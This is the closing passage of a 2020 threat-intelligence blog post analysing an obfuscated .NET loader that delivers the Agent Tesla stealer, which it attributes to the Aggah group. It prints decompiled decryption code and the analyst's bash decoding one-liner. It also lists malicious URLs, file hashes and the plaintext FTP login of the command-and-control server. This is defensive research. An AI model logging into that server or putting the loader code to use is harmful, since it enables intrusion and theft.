                <span style="color:#66d9ef">byte</span>[] array7 = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[num2];
                Buffer.BlockCopy(array6, <span style="color:#ae81ff">0</span>, array2, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">32</span>);
                Buffer.BlockCopy(array6, <span style="color:#ae81ff">32</span>, array3, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span>);
                Buffer.BlockCopy(array6, <span style="color:#ae81ff">48</span>, array7, <span style="color:#ae81ff">0</span>, num2);
                <span style="color:#66d9ef">return</span> Encoding.UTF8.GetString(&lt;Module&gt;.smethod_1(array7, array2, array3));
        }
        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>;
}

<span style="color:#75715e">// Token: 0x06000003 RID: 3 RVA: 0x00011150 File Offset: 0x0000F350
</span><span style="color:#75715e"></span><span style="color:#66d9ef">internal</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span>[] smethod_1(<span style="color:#66d9ef">byte</span>[] byte_0, <span style="color:#66d9ef">byte</span>[] byte_1, <span style="color:#66d9ef">byte</span>[] byte_2)
{
        Rijndael rijndael = Rijndael.Create();
        rijndael.Key = byte_1;
        rijndael.IV = byte_2;
        <span style="color:#66d9ef">return</span> rijndael.CreateDecryptor().TransformFinalBlock(byte_0, <span style="color:#ae81ff">0</span>, byte_0.Length);
}
</code></pre></div><p>and a huge blob of ints shortly after, lets make an educated guess and try to decode this blob.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat JKHLDqkYnadvWavArpqrFZCbXEpmNqbrFOBfl/<span style="color:#ae81ff">\&lt;</span>Module<span style="color:#ae81ff">\&gt;</span>.cs  | grep -Pzo <span style="color:#e6db74">&#34;new uint\[\]\n\s+{[^}]+}&#34;</span>| sed -e <span style="color:#e6db74">&#39;s#.new uint..##&#39;</span> | tr -d <span style="color:#e6db74">&#39;}&#39;</span> | tr -d u | sed -e <span style="color:#e6db74">&#39;s/\s*//&#39;</span> | tr <span style="color:#e6db74">&#34;\n&#34;</span> <span style="color:#e6db74">&#34; &#34;</span> | sed -e <span style="color:#e6db74">&#34;s/{/\n/g&#34;</span>|tr -d <span style="color:#e6db74">&#34; &#34;</span> | xargs -I<span style="color:#f92672">{}</span> python2 -c <span style="color:#e6db74">&#39;import sys,struct; from mlib.crypto import aes;unpad = lambda s: s[:-ord(s[len(s) - 1:])];e=&#34;&#34;.join(map(lambda x: struct.pack(&#34;I&#34;,int(x)),sys.argv[1].split(&#34;,&#34;)));x=aes.decrypt(e[48:],e[:32],&#34;cbc&#34;,None,e[32:48]);print unpad(x)&#39;</span> <span style="color:#e6db74">&#34;{}&#34;</span> &gt;  payload.bin_strings
</code></pre></div><p>You can find those strings <a href="https://malwarelab.pl/d/payload.4cd35bcc7793a04daa0c20774ff2a60c3f1ae693964011cb34d13544dda8b500.strings.txt">here</a>. In those strings we can find bunch of hints from which software this malware steales data from but mosty we can find informations about C&amp;C server.</p>
<pre><code>...
ftp://ftp.metris3d.hu/
seed@metris3d.hu
Team2318@
...
</code></pre><p>further examination of strings and code reveal its <strong>Agent Tesla</strong>.</p>
<h1 id="attribution">Attribution</h1>
<p>At that point i had no idea what I&rsquo;m actually look at, so i start pivoting - Agent Tesla with confuser is way to generic but loader with a unknown packer can be something unique. If you look closely into <code>Guwav/Properties/AssemblyInfo.cs</code> you can find very strange definition</p>
<pre><code>[assembly: AssemblyTrademark(&quot;kernel32||CreateProcessA||GetThreadContext||Wow64GetThreadContext||SetThreadContext||Wow64SetThreadContext||ReadProcessMemory||WriteProcessMemory||ZwUnmapViewOfSection||ntdll||VirtualAllocEx||ResumeThread&quot;)]
</code></pre><p>this sounds like a great pivot!
Indeed it is, soon after querying for <code>metadata:&quot;kernel32||CreateProcessA||GetThreadContext||Wow64GetThreadContext||SetThreadContext||Wow64SetThreadContext||ReadProcessMemory||WriteProcessMemory||ZwUnmapViewOfSection||ntdll||VirtualAllocEx||ResumeThread&quot;</code> on VT we will find this</p>
<p><img src="/static/blog/img/bashfu_aggah.vt.png" alt=""></p>
<p>While this is hardly any proof, its a hint for a direction. After examine the files from VT and the one described in <a href="https://blog.yoroi.company/research/apt-or-not-apt-whats-behind-the-aggah-campaign/">Yoroi&rsquo;s blog post</a> and comparing to my loader i reached a conclusion that it is indeed the same one. However this loader can still be used by other parties, but while this campaign is quite different that the one previously described one can find some similarities such ash</p>
<ul>
<li>use of off the shelf .NET RAT</li>
<li>heavy use of StrReverse in early stages</li>
<li>Mixture of VBS, Powershell and JScript</li>
<li>Way of encoding payload in later stages</li>
<li>Consistent way of using ConfuserEX</li>
</ul>
<p>With all that in mind i would say with medium confidence that this is another campaign from <strong>Aggah</strong> stable</p>
<h1 id="conclusion">Conclusion</h1>
<p>When dealing with a many script based droppers using bash tools such as grep, send and awk can be a tremendous help, and since most of those encodings are used in in one or two campaigns there is no real need to create tons of throw-away scripts. This static method of analysis is obviously more tedious and time consuming than throwing things into sandbox and just read the results it may reveal artifacts that would be missed in automated analysis. Artifacts such as childish use of <strong>putin</strong> and <strong>mossad</strong> keywords. Another curious thing that we would probably missed is password for ftp account, same password was mentioned in a PAN&rsquo;s Unit42 <a href="https://unit42.paloaltonetworks.com/unit42-how-to-track-actors-behind-keyloggers-using-embedded-credentials/">blog post</a> few years back, this password is unique enough to give a clue of possible history of the group or operator.</p>
<h1 id="analysis-artifacts---hashes-domains-urls-etc">Analysis Artifacts - Hashes, domains, urls, etc</h1>
<pre><code>URL:
http://office-archives.duckdns.org/cloud/clearance.rtf
http://www.statuscrew.gr/NDA/putin.js
http://janvierassocies.fr/office/fact.jpg
ftp:///ftp.metris3d.hu/

HASHES:
47625e693220465ced292aefd7c61fffc77dedd01618432da177a3b89525be9b
17a8d46df8cdf7db3f9996a25dce7c78abb0cef0d7d55d94d39caf880801466b
854a0a9603b288cdf01fdcd0cc7feffb8393d35a80fca6ad981575cbe207aee4
59012e676ed866ba013b1d950d1ef0558d7ea09e0a764ff65ee5b43663e918ea
e4d14ba73670184066a00cf5d3361580f6c4fbc5d0862a90278d82e95426faa5
8ed29945294e0ba0ae9d5c94c3871dfb00eb9c32b2c7a7704005b31642977a02
4cd35bcc7793a04daa0c20774ff2a60c3f1ae693964011cb34d13544dda8b500

FILE NAMES:
Updated Pre-Contract.docx
InstallUtil.exe
cloud.js
clearance.rtf

C2 LOGIN:
seed@metris3d.hu
Team2318@

</code></pre>
        </div>
        <div class="article-info">
    
        <div class="article-date">2020-02-26</div>
    
    <div class="article-taxonomies">
        
            
                <ul class="article-tags">
                    
                        <li><a href="https://blog.malwarelab.pl/tags/aggah">#Aggah</a></li>
                    
                        <li><a href="https://blog.malwarelab.pl/tags/threat-intel">#Threat Intel</a></li>
                    
                        <li><a href="https://blog.malwarelab.pl/tags/bashfu">#bashfu</a></li>
                    
                        <li><a href="https://blog.malwarelab.pl/tags/scripting">#scripting</a></li>
                    
                </ul>
        
    </div>
</div>
    </article>
    


        </main>
        <footer>
            
                <p>© 2020<br>
Powered by <a target="_blank" href="https://gohugo.io/">Hugo</a>, theme <a target="_blank" href="https://github.com/mitrichius/hugo-theme-anubis">Anubis</a>.
</p>
            
        </footer>
    </div>
</body>
</html>
